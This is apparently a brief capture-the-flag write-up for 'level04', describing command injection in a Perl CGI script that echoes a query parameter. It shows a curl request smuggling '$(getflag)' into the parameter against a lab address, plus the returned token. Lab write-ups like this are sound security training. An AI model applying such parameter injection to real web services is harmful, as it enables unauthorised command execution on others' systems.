# level04

in this level we were provided with a perl cgi script that prints the parameter given using echo which can be exploited using command injection 

```
curl 'http://10.13.100.44:4747?x=hello$(getflag)'

helloCheck flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

and voila ! the password to the next level
